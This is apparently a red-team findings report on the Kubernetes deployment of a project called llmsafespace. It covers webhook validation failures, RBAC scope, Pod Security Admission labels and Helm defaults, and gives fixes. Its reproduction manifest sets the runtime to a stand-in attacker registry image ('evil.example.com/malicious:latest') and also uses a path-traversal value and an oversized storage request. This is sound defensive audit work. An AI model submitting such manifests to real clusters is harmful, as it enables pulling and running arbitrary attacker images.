# Phase 6 — Kubernetes & Infrastructure — Findings

**Status:** Complete
**Cluster:** `admin@home-kubernetes`, image `sha-eb5c33e`
**Harness:** [`harness/run-phase6.py`](./harness/run-phase6.py)
**Worklog:** [`worklogs/0091_*-epic17-phase-6-k8s-infra.md`](../../../../worklogs/)

## Summary

| Result | Count |
|---|---|
| PASS | 7 |
| FAIL | 8 |
| INCONCLUSIVE | 1 |

## Findings (rolling severity, Phase 6 only)

| ID | Result | Severity | Title |
|---|---|---|---|
| **RT-6.1** | FAIL | **high** | Webhook accepts `runtime: "../../etc/passwd"` and 999999Gi storage |
| **RT-6.10** | FAIL | **critical** | Webhook accepts `runtime: "evil.example.com/malicious:latest"` |
| **RT-6.2** | FAIL | medium | Controller SA cluster-bound by default (G5) |
| **RT-6.16** | FAIL | medium | Helm default `rbac.scope=cluster` (G5 confirmed at chart level) |
| **RT-6.11** | FAIL | medium | Default ns lacks PSA `enforce: restricted` label (G11 confirmed) |
| **RT-6.6** | FAIL | low | No preflight Job for etcd encryption check |
| **RT-6.13** | FAIL | low | No Helm preflight for CNI/etcd assumptions |
| **RT-6.14** | FAIL | low | Ingress TLS not enabled by default in values.yaml |
| RT-6.3 | PASS | info | API SA scoped to namespace |
| RT-6.4 | PASS | info | Webhook bypass requires cluster-admin (accepted) |
| RT-6.5 | PASS | info | Helm template prevents YAML injection |
| RT-6.7 | PASS | info | PVC cross-mount blocked by ownerReferences |
| RT-6.8 | PASS | info | API SA can-i shows no cross-namespace secret access |
| RT-6.12 | PASS | info | NetPols present (G16 holds) |
| RT-6.15 | PASS | info | Postgres + Valkey services are ClusterIP |
| RT-6.9 | INCONCLUSIVE | info | Lease integrity (would need controller SA forge) |

## Critical Finding: RT-6.1 + RT-6.10 — Webhook does not validate Spec.Runtime

**Reproduction:**
```yaml
apiVersion: llmsafespace.dev/v1
kind: Workspace
metadata: {name: p6-rt-6-10, namespace: default}
spec:
  owner: {userID: phase6-test}
  runtime: evil.example.com/malicious:latest    # ← arbitrary registry
  storage: {size: 1Gi}
```
`kubectl apply -f -` returns: `workspace.llmsafespace.dev/p6-rt-6-10 created`. No admission rejection.

Likewise `runtime: "../../etc/passwd"` and `storage.size: "999999Gi"` are accepted.

**Impact:**
- **RT-6.10** = arbitrary image pull → already classified critical in Phase 1 (RT-1.2 F1.2.1) and Phase 2 (RT-2.18). The webhook is the right place to fix this. It's currently doing nothing on `Spec.Runtime`.
- **RT-6.1** storage.size: a user can request 999999Gi, which the cluster will likely fail to provision but burns operator attention; resource limits CRD-level bound is needed.
- **RT-6.1** runtime: "../../etc/passwd" → controller treats this as an image ref and tries to pull it. Image-pull will fail, but the workspace is admission-accepted. Should reject early.

**Fix:**
The validating webhook handler at `controller/internal/webhooks/workspace_webhook.go` (or wherever it lives) should:
1. Validate `Spec.Runtime` against an operator-provided allow-list (Helm value `runtimes.allowed`).
2. Validate `Spec.Storage.Size` against `Spec.Storage.Size <= maxSize` (e.g., 100Gi default).
3. Reject any `runtime` containing path-traversal characters or non-image-ref shape.

## Pre-existing gaps re-confirmed

### G5 — Controller cluster-scoped RBAC by default (RT-6.2 + RT-6.16)
`charts/llmsafespace/values.yaml`:
```yaml
rbac:
  create: true
  scope: cluster      # default
```
Defenders' principle of least privilege violated. Fix: flip default to `namespace`; document opt-in for multi-namespace.

### G11 — PSA enforce missing (RT-6.11)
`default` namespace has only `kubernetes.io/metadata.name=default`. No `pod-security.kubernetes.io/enforce` label. Fix: add label to `charts/llmsafespace/templates/namespace.yaml` (or whatever creates the workspace ns).

### G16 — NetPols (RT-6.12) — confirmed holding
Both required NetworkPolicies are present and live. ✅

## Pre-existing gaps NOT validated (positive findings)

- **RT-6.7** PVC cross-mount blocked by controller's ownerReferences logic.
- **RT-6.5** Helm template uses safe quoting; YAML injection blocked.
- **RT-6.15** Postgres + Valkey services are ClusterIP.

## Cleanup

`p6-rt-6-1`, `p6-rt-6-10` workspaces deleted. No residue.
